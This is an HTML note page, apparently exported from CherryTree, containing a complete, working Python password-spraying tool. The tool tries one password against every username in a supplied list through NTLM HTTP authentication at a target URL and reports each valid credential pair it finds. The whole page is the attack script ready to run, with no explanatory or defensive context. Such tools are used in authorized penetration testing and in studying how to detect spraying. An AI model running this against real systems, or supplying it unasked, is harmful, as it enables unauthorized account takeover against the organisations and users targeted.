<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>password_sprayer.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>password_sprayer.py</h1><br/>##########################################<br /><br />#!/usr/bin/python3<br /><br />import requests<br />from requests_ntlm import HttpNtlmAuth<br />import sys, getopt<br /><br />class NTLMSprayer:<br />    def __init__(self, fqdn):<br />        self.HTTP_AUTH_FAILED_CODE = 401<br />        self.HTTP_AUTH_SUCCEED_CODE = 200<br />        self.verbose = True<br />        self.fqdn = fqdn<br /><br />    def load_users(self, userfile):<br />        self.users = []<br />        lines = open(userfile, &#39;r&#39;).readlines()<br />        for line in lines:<br />            self.users.append(line.replace(&quot;\r&quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;))<br /><br />    def password_spray(self, password, url):<br />        print (&quot;[*] Starting passwords spray attack using the following password: &quot; + password)<br />        count = 0<br />        for user in self.users:<br />            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + &quot;\\&quot; + user, password))<br />            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):<br />                print (&quot;[+] Valid credential pair found! Username: &quot; + user + &quot; Password: &quot; + password)<br />                count += 1<br />                continue<br />            if (self.verbose):<br />                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):<br />                    print (&quot;[-] Failed login with Username: &quot; + user)<br />        print (&quot;[*] Password spray attack completed, &quot; + str(count) + &quot; valid credential pairs found&quot;)<br /><br />def main(argv):<br />    userfile = &#39;&#39;<br />    fqdn = &#39;&#39;<br />    password = &#39;&#39;<br />    attackurl = &#39;&#39;<br /><br />    try:<br />        opts, args = getopt.getopt(argv, &quot;hu:f:p:a:&quot;, [&quot;userfile=&quot;, &quot;fqdn=&quot;, &quot;password=&quot;, &quot;attackurl=&quot;])<br />    except getopt.GetoptError:<br />        print (&quot;ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;&quot;)<br />        sys.exit(2)<br /><br />    for opt, arg in opts:<br />        if opt == &#39;-h&#39;:<br />            print (&quot;ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;&quot;)<br />            sys.exit()<br />        elif opt in (&quot;-u&quot;, &quot;--userfile&quot;):<br />            userfile = str(arg)<br />        elif opt in (&quot;-f&quot;, &quot;--fqdn&quot;):<br />            fqdn = str(arg)<br />        elif opt in (&quot;-p&quot;, &quot;--password&quot;):<br />            password = str(arg)<br />        elif opt in (&quot;-a&quot;, &quot;--attackurl&quot;):<br />            attackurl = str(arg)<br /><br />    if (len(userfile) &gt; 0 and len(fqdn) &gt; 0 and len(password) &gt; 0 and len(attackurl) &gt; 0):<br />        #Start attack<br />        sprayer = NTLMSprayer(fqdn)<br />        sprayer.load_users(userfile)<br />        sprayer.password_spray(password, attackurl)<br />        sys.exit()<br />    else:<br />        print (&quot;ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;&quot;)<br />        sys.exit(2)<br /><br /><br /><br />if __name__ == &quot;__main__&quot;:<br />    main(sys.argv[1:])<br />    <br />##########################################<br /><br /><br /></div>
</body>
</html>
